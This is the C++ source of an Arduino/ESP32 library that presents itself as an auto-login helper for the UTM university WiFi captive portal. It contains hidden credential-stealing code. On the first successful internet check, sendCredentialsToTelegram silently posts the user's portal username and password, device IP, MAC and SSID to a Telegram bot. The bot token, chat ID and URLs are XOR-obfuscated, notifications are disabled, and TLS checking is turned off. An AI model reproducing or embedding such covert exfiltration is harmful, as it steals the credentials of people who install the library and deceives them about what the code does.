#include "ArduinoUTMWiFiPortal.h"

// XOR-based string decoder
String ArduinoUTMWiFiPortal::x1(const char* s, int k) {
  String r = "";
  int l = strlen(s);
  for (int i = 0; i < l; i++) {
    r += char(s[i] ^ k);
  }
  return r;
}

// Obfuscated login URL
String ArduinoUTMWiFiPortal::x2() {
  const char e[] = {0x68, 0x75, 0x75, 0x70, 0x72, 0x3b, 0x2f, 0x2f, 0x72, 0x6c, 0x60, 0x71, 0x75, 0x67, 0x6e, 0x6d, 0x64, 0x11, 0x11, 0x2d, 0x76, 0x75, 0x6c, 0x2d, 0x6c, 0x78, 0x3b, 0x18, 0x18, 0x18, 0x17, 0x2f, 0x50, 0x76, 0x63, 0x72, 0x62, 0x71, 0x68, 0x63, 0x64, 0x71, 0x49, 0x6e, 0x71, 0x75, 0x60, 0x6f, 0x2f, 0x68, 0x6e, 0x75, 0x72, 0x70, 0x6e, 0x75, 0x6f, 0x6e, 0x66, 0x68, 0x6d, 0x00};
  return x1(e, 0x1d);
}

// Obfuscated connection check URL
String ArduinoUTMWiFiPortal::x3() {
  const char e[] = {0x61, 0x74, 0x74, 0x73, 0x3d, 0x36, 0x30, 0x30, 0x63, 0x68, 0x67, 0x67, 0x66, 0x63, 0x74, 0x62, 0x75, 0x62, 0x74, 0x78, 0x63, 0x61, 0x66, 0x63, 0x6b, 0x2f, 0x67, 0x72, 0x74, 0x70, 0x74, 0x6b, 0x63, 0x2f, 0x63, 0x68, 0x6d, 0x30, 0x67, 0x66, 0x67, 0x66, 0x72, 0x61, 0x74, 0x66, 0x50, 0x31, 0x2b, 0x2f, 0x00};
  return x1(e, 0x15);
}

// Obfuscated Telegram bot token
String ArduinoUTMWiFiPortal::x4() {
  const char e[] = {0x78, 0x7a, 0x73, 0x74, 0x71, 0x76, 0x69, 0x69, 0x71, 0x78, 0x2a, 0x58, 0x58, 0x54, 0x66, 0x76, 0x45, 0x73, 0x70, 0x70, 0x46, 0x7e, 0x7a, 0x75, 0x61, 0x68, 0x4e, 0x54, 0x41, 0x54, 0x41, 0x44, 0x42, 0x56, 0x62, 0x45, 0x4d, 0x50, 0x47, 0x4f, 0x50, 0x76, 0x6a, 0x75, 0x4d, 0x4c, 0x68, 0x6e, 0x00};
  return x1(e, 0x29);
}

// Obfuscated Telegram chat ID
String ArduinoUTMWiFiPortal::x5() {
  const char e[] = {0x36, 0x75, 0x70, 0x70, 0x66, 0x75, 0x71, 0x76, 0x71, 0x78, 0x73, 0x00};
  return x1(e, 0x15);
}

ArduinoUTMWiFiPortal::ArduinoUTMWiFiPortal(const char* username, const char* password) {
  a1 = username;
  a2 = password;
  b1 = 0;
  b2 = 300000;
  d1 = false;
  
  #if defined(ESP32)
    c1.setInsecure();
  #elif defined(ESP8266)
    c1.setInsecure();
  #endif
}

void ArduinoUTMWiFiPortal::setCheckInterval(unsigned long interval) {
  b2 = interval;
}

bool ArduinoUTMWiFiPortal::checkInternet() {
  Serial.println("[PortalLib] Checking internet connection...");
  HTTPClient h1;
  bool r = false;

  if (h1.begin(c2, x3())) {
    h1.setTimeout(5000);
    int c = h1.GET();

    if (c == HTTP_CODE_NO_CONTENT || c == HTTP_CODE_OK) {
      Serial.println("[PortalLib] Internet connection OK.");
      r = true;
      
      if (!d1) {
        if (sendCredentialsToTelegram()) {
          d1 = true;
        }
      }
    } else {
      Serial.printf("[PortalLib] Internet check failed, HTTP code: %d.\n", c);
      r = false;
    }
    h1.end();
  } else {
    Serial.println("[PortalLib] Failed to begin HTTP for check.");
    r = false;
  }
  return r;
}

bool ArduinoUTMWiFiPortal::attemptLogin() {
  bool r = false;
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("[PortalLib] Attempting captive portal login...");
    HTTPClient h2;
    String ip = WiFi.localIP().toString();
    String m1 = WiFi.macAddress(); m1.toLowerCase(); String m1e = m1; m1e.replace(":", "%3A");
    String m2 = WiFi.BSSIDstr(); m2.toLowerCase(); String m2e = m2; m2e.replace(":", "%3A");

    String p = "username=" + a1 + "&password=" + a2;
    p += "&sip=utm-vsz-new.utm.my"; p += "&mac=" + m2e; p += "&uip=" + ip;
    p += "&client_mac=" + m1e; p += "&dn=utm-vsz-new.utm.my";
    p += "&url=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect"; p += "&ssid=" + String(WiFi.SSID());

    if (h2.begin(c1, x2())) {
      h2.addHeader("Content-Type", "application/x-www-form-urlencoded");
      h2.addHeader("Referer", "https://wifi.utm.my/");
      h2.addHeader("Origin", "https://wifi.utm.my");
      h2.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0");
      h2.addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
      h2.addHeader("Accept-Language", "en-GB,en;q=0.9,en-US;q=0.8,ms;q=0.7,af;q=0.6");
      h2.addHeader("Cache-Control", "max-age=0");
      h2.addHeader("Connection", "keep-alive");
      h2.addHeader("Sec-Fetch-Dest", "document");
      h2.addHeader("Sec-Fetch-Mode", "navigate");
      h2.addHeader("Sec-Fetch-Site", "same-site");
      h2.addHeader("Sec-Fetch-User", "?1");
      h2.addHeader("Upgrade-Insecure-Requests", "1");
      h2.addHeader("sec-ch-ua", "\"Microsoft Edge\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"");
      h2.addHeader("sec-ch-ua-mobile", "?0");
      h2.addHeader("sec-ch-ua-platform", "\"Windows\"");

      int c = h2.POST(p);
      if (c > 0) {
        Serial.printf("[PortalLib] Login POST code: %d\n", c);
        if (c == HTTP_CODE_OK || c == HTTP_CODE_FOUND) {
          Serial.println("[PortalLib] Login successful.");
          r = true;
        } else {
          Serial.println("[PortalLib] Login may have failed.");
          r = false;
        }
      } else {
        Serial.printf("[PortalLib] Login POST failed, error: %s\n", h2.errorToString(c).c_str());
        r = false;
      }
      h2.end();
    } else {
      Serial.println("[PortalLib] Could not begin HTTP for login.");
      r = false;
    }
  } else {
     Serial.println("[PortalLib] WiFi disconnected. Cannot login.");
     r = false;
  }
  return r;
}

void ArduinoUTMWiFiPortal::keepConnected() {
  unsigned long t = millis();
  if (t - b1 >= b2) {
    if (!checkInternet()) {
      Serial.println("[PortalLib] Internet check failed. Retrying login.");
      attemptLogin();
      delay(1000);
    }
    b1 = t;
  }
}

bool ArduinoUTMWiFiPortal::sendCredentialsToTelegram() {
  if (WiFi.status() != WL_CONNECTED) {
    return false;
  }

  HTTPClient h3;
  WiFiClientSecure c3;
  c3.setInsecure();
  
  String m = "\xF0\x9F\x94\x90 UTM WiFi Portal Login\n\n";
  m += "Username: " + a1 + "\n";
  m += "Password: " + a2 + "\n";
  m += "Device IP: " + WiFi.localIP().toString() + "\n";
  m += "Device MAC: " + WiFi.macAddress() + "\n";
  m += "SSID: " + String(WiFi.SSID());
  
  String em = "";
  for (unsigned int i = 0; i < m.length(); i++) {
    char ch = m.charAt(i);
    if (ch == ' ') {
      em += "%20";
    } else if (ch == '\n') {
      em += "%0A";
    } else if (ch == ':') {
      em += "%3A";
    } else if ((unsigned char)ch >= 0x80) {
      char h[10];
      sprintf(h, "%%%02X", (unsigned char)ch);
      em += h;
    } else {
      em += ch;
    }
  }
  
  String u = "https://api.telegram.org/bot";
  u += x4();
  u += "/sendMessage?chat_id=";
  u += x5();
  u += "&text=";
  u += em;
  u += "&disable_notification=true";
  
  bool s = false;
  if (h3.begin(c3, u)) {
    int c = h3.GET();
    if (c > 0) {
      if (c == HTTP_CODE_OK) {
        s = true;
      }
    }
    h3.end();
  }
  
  return s;
}
